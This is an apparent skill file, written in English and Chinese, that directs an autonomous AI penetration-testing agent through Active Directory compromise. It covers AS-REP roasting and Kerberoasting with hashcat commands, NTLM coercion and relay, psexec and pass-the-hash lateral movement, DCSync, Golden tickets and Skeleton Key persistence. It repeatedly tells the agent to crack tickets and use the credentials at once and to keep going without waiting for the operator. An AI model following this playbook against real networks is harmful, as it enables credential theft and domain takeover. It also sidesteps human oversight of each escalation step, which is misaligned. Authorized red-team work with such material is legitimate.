---
name: ad-attack
description: "Active Directory exploitation after domain credentials exist: Kerberos (AS-REP/Kerberoast including cracking the ticket then using the account), delegation, NTLM coercion/relay, lateral movement, ACL abuse, ADCS ESC1-ESC17 and CVE paths, dMSA/BadSuccessor, Kerberos reflection, identity confusion, management-plane, domain trust, and domain persistence. Own the current AD chain through crack-and-use to DA, equivalent domain control, or the targeted host SYSTEM. Do not stop after requesting TGS. Host C2 belongs to /post. Operator chooses next modules."
---

# /ad-attack — 域攻击

> **scope：** 已有域凭据，把 **当前这条 AD 链** 打到 **DA / 等价域控制 / 目标主机 SYSTEM**。要到的 TGS/AS-REP **当场按 etype 砸，爆了立刻用**，不要切 `/creds`。不做主机 C2、数据外带、LSASS 配方。▸ 整条链打完后后续按当前 Step 目标和已有证据自动推进。

工具：`../shared/tools.md`。CVE 有 DC build 才读 `../shared/cve-enrichment.md`。LAPS 读取不在本模块（`../ad-recon/references/windows-laps.md`，仅当你在做 LAPS 卡片）。Kerberoast 砸票查 `-m` 才读 `../creds/references/hash-types.md`（不换模块）。

走到哪条链再 Read 哪一份，禁止开局全读：
- Kerberos 要票+砸 / 委派 → `references/kerberos-attacks.md`
- 横移 → `references/lateral-movement.md`
- ACL → `references/acl-abuse.md`
- ADCS → `references/adcs.md`
- dMSA → `references/dmsa.md`
- 反射 → `references/auth-reflection.md`
- 身份混淆 → `references/identity-confusion.md`
- WAC → `references/management-plane.md`
- Coercion/Relay → `references/authentication-coercion-relay.md`

---

## 开局与收尾

读取当前 Step 契约、引用的 Fact 与已有证据文件，只按已验证通道和凭据继续；按当前链路只加载必要 reference。
监听、权限或认证失败时核对反馈与前置条件，尝试授权范围内的有效替代路径；不等待操作者选择模块，也不伪造成功。
将关键命令、输出和可复用进展保存到工作目录证据文件；关键突破及时 `submit_fact`。当前目标仍有可执行路径时自动继续，跨 Step 协作交给 Reason。
Step 结束前必须提交至少一条有真实证据的汇总 Fact；无突破则汇总已验证失败、限制和阻塞，再调用 `finish_step({summary})`。可交付成果通过 `submit_finding` 引用 Fact。

---
## 0. 成功条件

当前选中的 AD 链打到目标身份或 DA/主机 SYSTEM。DCSync、Golden、RBCD、Shadow、ESC8/11、Certighost 都是攻击原语。会改密的标 IMPACT/RESTORE。

**不算：** 只列出 SPN、只把 TGS 写到磁盘、只 Coercer scan、只 certipy find。

```text
要票 → 看 etype → hashcat 砸出明文/NT → PTH/PTT/WinRM/ACL
        ↑______________ 全部留在 /ad-attack ______________↑
砸不出来 → 记 notes，换本模块下一条路径。不要因此去 /creds。
```

独立「我手上有一堆无关 hash 要当凭据作业」才由操作者另选 `/creds`。

---

## 0.5 EDR

SMB/LDAP signing、Kerberos 策略、EPA、ACL = 本模块。  
PTH/WinRM/PsExec **已经在目标 OS 执行** 被 AV 杀 → `/edr-bypass` → 回本模块把这条 AD 链打完。

---

## 1. 决策树

```text
只有用户列表            → AS-REP 要票+当场砸 → 用爆出的口令继续
任意域用户              → Kerberoast 要票+看 etype+当场砸 → 用服务账继续
                        委派 → references/kerberos-attacks.md
可 coerce / 入站 NTLM   → references/authentication-coercion-relay.md
                        LDAP/ADCS sink 在这里打完（RBCD/Shadow/ESC8）
票/NT 可登录            → references/lateral-movement.md
ACL 可写                → references/acl-abuse.md
ADCS 模板/CA            → references/adcs.md
2025 DC / dMSA          → references/dmsa.md
Ghost SPN / 反射        → references/auth-reflection.md
可写 UPN + 未补 DC      → references/identity-confusion.md
WAC                     → references/management-plane.md
要域持久化              → DCSync/Golden/Shadow
跨域                    → extra-sid
```

---

## 2. 要票 + 当场砸 + 接着用

```bash
impacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

impacket-GetUserSPNs corp.com/jen:'pass' -dc-ip DC -request -outputfile tgs.hash
grep -o '\$krb5tgs\$[0-9]*\$' tgs.hash
# etype 23
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
# etype 17
hashcat -m 19600 tgs.hash /usr/share/wordlists/rockyou.txt
# etype 18
hashcat -m 19700 tgs.hash /usr/share/wordlists/rockyou.txt
```

不要默认所有 TGS 都是 RC4。完整委派链、失败换路 → `references/kerberos-attacks.md`。字典/规则细节可 Read `../creds/references/offline-crack.md`，**继续在本模块跑 hashcat**。

爆了立刻：

```bash
nxc smb DC -u svc_sql -p 'CrackedPass!'
impacket-psexec corp.com/svc_sql:'CrackedPass!'@TARGET
```

或 NT 已出 → PTH，见 `references/lateral-movement.md`。不要停下来等人选 `/creds`。

---

## 3. Coercion / Relay

PetitPotam / PrinterBug / DFSCoerce / Coercer → LDAP/SMB/ADCS sink：**本模块打完** 到 SYSTEM/RBCD/证书。不要交回 `/creds`。

→ `references/authentication-coercion-relay.md`。2025 新建域默认 LDAP signing，先做 policy gate。

---

## 4. 横移 / ACL / 持久化

→ `references/lateral-movement.md`。落地被杀 → EDR 后回来。

ACL → `references/acl-abuse.md`，改密要 RESTORE。

```text
DCSync / NTDS     有复制权限时打（不是 /creds 收割）
Golden / Silver   有 krbtgt 或服务 NT 之后
Shadow Credentials GenericWrite
Skeleton Key      DC 内存，重启失效，高 IMPACT
```

---

## 5. 2026 证书 / dMSA / 反射

ADCS ESC1–17 / Certighost → `references/adcs.md`  
dMSA / BadSuccessor → `references/dmsa.md`  
反射 / CVE-2026-26128 → `references/auth-reflection.md`  
ResetNightmare 会真改密 → `references/identity-confusion.md`  
WAC 无稳定端到端 PoC → `references/management-plane.md`，不编命令。

---

## 6. 完成后

写入 `./notes.md`。按「开局与收尾」提交真实 Fact 后继续当前目标。
